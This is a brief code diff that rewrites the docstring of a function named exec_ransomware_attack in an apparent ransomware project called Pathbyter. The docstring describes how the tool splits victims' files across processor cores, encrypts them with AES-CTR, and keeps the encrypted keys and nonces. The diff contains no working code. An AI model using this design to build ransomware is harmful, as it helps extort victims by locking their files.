@@ -239,8 +239,13 @@ def exec_ransomware_attack(file_path):
     iterable (the list of target files). Pathbyter uses the System 
     class to populate the target files list, and determine the number 
     of cores. Then it divides the iterable equally among the number 
-    of processes of target files equally among the number of 
-    processors the victim system has. 
+    of processors the victim system has and encrypts them in a loop, 
+    appending the encrypted AES keys needed for encryption and their
+    associated nonce. exec_ransomware_attack()uses an AES CTR cipher,
+    where as generate_session_keys() uses an AES CBC cipher. CTR ciphers
+    encrypt bits in parallell using XOR, essentially turning the function
+    into a stream cipher. CTR is (from my understanding)the fastest 
+    implementation of AES.
     
     >> For all the files in target files: AESCTR Encrypt file 
         and dump all the necessary things for decryption into
